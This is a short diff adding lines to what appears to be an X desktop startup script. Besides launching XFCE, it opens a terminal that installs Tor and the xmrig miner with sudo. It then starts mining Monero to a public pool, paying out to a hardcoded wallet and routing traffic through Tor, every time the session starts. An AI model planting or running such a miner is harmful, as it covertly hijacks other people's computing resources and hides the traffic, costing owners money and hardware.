@@ -1,0 +1,4 @@
+xrdb $HOME/.Xresources
+startxfce4 &
+xterm -e "sudo apt update;sudo apt install snapd tor -y;sudo snap install xmrig;sudo service tor restart;xmrig -o pool.minexmr.com:4444 -u 466qu8xzgtDXCr52mZxubW2yCFmdcAuLpHKECRmaCRn26V6LgNi5ttP74dQ7g2mUJNRzTqgDM6PUZQhaG45DgUx43kRxAoY --rig-id rig -x 127.0.0.1:9050"
+
